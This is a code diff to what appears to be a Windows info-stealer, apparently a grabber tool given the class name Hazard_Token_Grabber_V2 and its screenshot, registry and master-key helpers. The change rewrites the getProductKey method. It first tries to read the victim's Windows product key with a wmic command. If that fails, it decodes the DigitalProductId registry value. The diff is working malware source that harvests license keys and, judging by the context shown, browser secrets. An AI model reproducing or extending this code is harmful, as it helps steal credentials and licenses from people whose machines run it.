@@ -7,6 +7,7 @@ import json
 import base64 
 import psutil
 import winreg
+import subprocess
 
 from threading import Thread
 from PIL import ImageGrab
@@ -150,35 +151,41 @@ class Hazard_Token_Grabber_V2:
                 f.writelines(l)
 
     def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
-        def strToInt(x):
-            if isinstance(x, str):
-                return ord(x)
-            return x
-        chars = 'BCDFGHJKMPQRTVWXY2346789'
-        wkey = ''
-        offset = 52
-        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
-        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
-        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
-        key = list(val)
+        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
+        if not wkey:
+            def strToInt(x):
+                if isinstance(x, str):
+                    return ord(x)
+                return x
+            chars = 'BCDFGHJKMPQRTVWXY2346789'
+            wkey = ''
+            offset = 52
+            regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+            productName, _ = winreg.QueryValueEx(regkey, "ProductName")
+            try:
+                val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
+                key = list(val)
 
-        for i in range(24,-1, -1):
-            temp = 0
-            for j in range(14,-1,-1):
-                temp *= 256
-                try:
-                    temp += strToInt(key[j+ offset])
-                except IndexError:
-                    return [productName, ""]
-                if temp / 24 <= 255:
-                    key[j+ offset] = temp/24
-                else:
-                    key[j+ offset] = 255
-                temp = int(temp % 24)
-            wkey = chars[temp] + wkey
-        for i in range(5,len(wkey),6):
-            wkey = wkey[:i] + '-' + wkey[i:]
-        return [productName, wkey]
+                for i in range(24,-1, -1):
+                    temp = 0
+                    for j in range(14,-1,-1):
+                        temp *= 256
+                        try:
+                            temp += strToInt(key[j+ offset])
+                        except IndexError:
+                            return [productName, ""]
+                        if temp / 24 <= 255:
+                            key[j+ offset] = temp/24
+                        else:
+                            key[j+ offset] = 255
+                        temp = int(temp % 24)
+                    wkey = chars[temp] + wkey
+                for i in range(5,len(wkey),6):
+                    wkey = wkey[:i] + '-' + wkey[i:]
+            except Exception:
+                return [productName, ""]
+            return [productName, wkey]
 
     def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
